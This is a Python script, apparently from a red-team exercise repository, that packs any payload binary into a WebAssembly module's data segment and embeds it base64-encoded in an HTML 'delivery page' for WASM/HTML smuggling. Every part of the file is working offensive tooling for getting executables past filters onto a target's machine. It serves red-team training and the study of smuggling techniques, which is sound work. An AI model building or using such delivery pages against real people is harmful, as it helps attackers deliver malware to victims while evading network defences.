#!/usr/bin/env python3
"""
Red Team Exercises #62 - WASM Payload Builder
Author: Joas Antonio dos Santos
Repository: https://github.com/CyberSecurityUP/Red-Team-Exercises

Embeds a payload binary into a WASM module's data segment.
The WASM module exports functions to retrieve the payload pointer and length.

Usage:
    python3 build_wasm_payload.py -i payload.exe -o delivery.html

Requirements: pip install wasmtime  (optional, for validation)
"""

import argparse
import base64
import struct
import sys
import os


def build_wasm_module(payload_bytes):
    """
    Build a minimal WASM module with payload in data segment.

    WASM binary format structure:
    - Magic number + version
    - Type section (function signatures)
    - Function section
    - Memory section
    - Export section
    - Code section
    - Data section (contains the payload)
    """

    payload_len = len(payload_bytes)
    # Align payload offset to 16 bytes
    data_offset = 16

    # Calculate pages needed (64KB per page)
    pages_needed = ((data_offset + payload_len) // 65536) + 1

    module = bytearray()

    # ---- WASM Header ----
    module += b'\x00asm'           # Magic
    module += struct.pack('<I', 1) # Version 1

    # ---- Type Section (section id = 1) ----
    # Two function types: both () -> i32
    type_section = bytearray()
    type_section += b'\x02'        # 2 types
    # Type 0: () -> i32
    type_section += b'\x60\x00\x01\x7f'
    # Type 1: () -> i32
    type_section += b'\x60\x00\x01\x7f'

    module += b'\x01'  # section id
    module += encode_uleb128(len(type_section))
    module += type_section

    # ---- Function Section (section id = 3) ----
    func_section = bytearray()
    func_section += b'\x02'  # 2 functions
    func_section += b'\x00'  # func 0 uses type 0
    func_section += b'\x01'  # func 1 uses type 1

    module += b'\x03'
    module += encode_uleb128(len(func_section))
    module += func_section

    # ---- Memory Section (section id = 5) ----
    mem_section = bytearray()
    mem_section += b'\x01'  # 1 memory
    mem_section += b'\x00'  # no max
    mem_section += encode_uleb128(pages_needed)

    module += b'\x05'
    module += encode_uleb128(len(mem_section))
    module += mem_section

    # ---- Export Section (section id = 7) ----
    export_section = bytearray()
    export_section += b'\x03'  # 3 exports

    # Export "memory"
    mem_name = b'memory'
    export_section += encode_uleb128(len(mem_name))
    export_section += mem_name
    export_section += b'\x02'  # memory export
    export_section += b'\x00'  # memory index 0

    # Export "get_payload_ptr"
    ptr_name = b'get_payload_ptr'
    export_section += encode_uleb128(len(ptr_name))
    export_section += ptr_name
    export_section += b'\x00'  # function export
    export_section += b'\x00'  # function index 0

    # Export "get_payload_len"
    len_name = b'get_payload_len'
    export_section += encode_uleb128(len(len_name))
    export_section += len_name
    export_section += b'\x00'  # function export
    export_section += b'\x01'  # function index 1

    module += b'\x07'
    module += encode_uleb128(len(export_section))
    module += export_section

    # ---- Code Section (section id = 10) ----
    code_section = bytearray()
    code_section += b'\x02'  # 2 function bodies

    # Function 0: get_payload_ptr() -> returns data_offset
    func0_body = bytearray()
    func0_body += b'\x00'  # 0 locals
    func0_body += b'\x41'  # i32.const
    func0_body += encode_sleb128(data_offset)
    func0_body += b'\x0b'  # end

    code_section += encode_uleb128(len(func0_body))
    code_section += func0_body

    # Function 1: get_payload_len() -> returns payload length
    func1_body = bytearray()
    func1_body += b'\x00'  # 0 locals
    func1_body += b'\x41'  # i32.const
    func1_body += encode_sleb128(payload_len)
    func1_body += b'\x0b'  # end

    code_section += encode_uleb128(len(func1_body))
    code_section += func1_body

    module += b'\x0a'
    module += encode_uleb128(len(code_section))
    module += code_section

    # ---- Data Section (section id = 11) ----
    data_section = bytearray()
    data_section += b'\x01'  # 1 data segment

    # Active data segment for memory 0
    data_section += b'\x00'  # memory index 0 (active)
    data_section += b'\x41'  # i32.const
    data_section += encode_sleb128(data_offset)
    data_section += b'\x0b'  # end init expr

    data_section += encode_uleb128(payload_len)
    data_section += payload_bytes

    module += b'\x0b'
    module += encode_uleb128(len(data_section))
    module += data_section

    return bytes(module)


def encode_uleb128(value):
    """Encode unsigned integer as ULEB128."""
    result = bytearray()
    while True:
        byte = value & 0x7f
        value >>= 7
        if value != 0:
            byte |= 0x80
        result.append(byte)
        if value == 0:
            break
    return bytes(result)


def encode_sleb128(value):
    """Encode signed integer as SLEB128."""
    result = bytearray()
    more = True
    while more:
        byte = value & 0x7f
        value >>= 7
        if (value == 0 and (byte & 0x40) == 0) or \
           (value == -1 and (byte & 0x40) != 0):
            more = False
        else:
            byte |= 0x80
        result.append(byte)
    return bytes(result)


def build_html(wasm_module, template_path=None):
    """Embed WASM module into HTML delivery page."""
    wasm_b64 = base64.b64encode(wasm_module).decode()

    if template_path and os.path.exists(template_path):
        with open(template_path, 'r') as f:
            html = f.read()
        html = html.replace('REPLACE_WITH_BASE64_WASM_MODULE', wasm_b64)
    else:
        # Use the wasm_smuggling.html template from this directory
        script_dir = os.path.dirname(os.path.abspath(__file__))
        template = os.path.join(script_dir, 'wasm_smuggling.html')
        if os.path.exists(template):
            with open(template, 'r') as f:
                html = f.read()
            html = html.replace('REPLACE_WITH_BASE64_WASM_MODULE', wasm_b64)
        else:
            html = f"<!-- WASM Module (base64): {wasm_b64} -->"

    return html


def main():
    parser = argparse.ArgumentParser(description='Build WASM payload smuggling page')
    parser.add_argument('-i', '--input', required=True, help='Payload binary to embed')
    parser.add_argument('-o', '--output', default='delivery.html', help='Output HTML file')
    parser.add_argument('-w', '--wasm-only', action='store_true',
                        help='Output only the .wasm file')
    args = parser.parse_args()

    if not os.path.exists(args.input):
        print(f"[-] File not found: {args.input}", file=sys.stderr)
        sys.exit(1)

    with open(args.input, 'rb') as f:
        payload = f.read()

    print(f"[*] Payload size: {len(payload)} bytes ({len(payload)/1024/1024:.1f} MB)", file=sys.stderr)

    if len(payload) > 50 * 1024 * 1024:
        print(f"[!] WARNING: Payload > 50MB. Browser atob() may fail with large base64.", file=sys.stderr)
        print(f"[!] Consider compressing the payload or using a smaller binary.", file=sys.stderr)

    wasm_module = build_wasm_module(payload)
    print(f"[+] WASM module size: {len(wasm_module)} bytes ({len(wasm_module)/1024/1024:.1f} MB)", file=sys.stderr)

    if args.wasm_only:
        with open(args.output, 'wb') as f:
            f.write(wasm_module)
        print(f"[+] WASM module written to: {args.output}", file=sys.stderr)
    else:
        html = build_html(wasm_module)
        with open(args.output, 'w') as f:
            f.write(html)
        html_size_mb = len(html.encode()) / 1024 / 1024
        print(f"[+] HTML delivery page written to: {args.output} ({html_size_mb:.1f} MB)", file=sys.stderr)


if __name__ == '__main__':
    main()
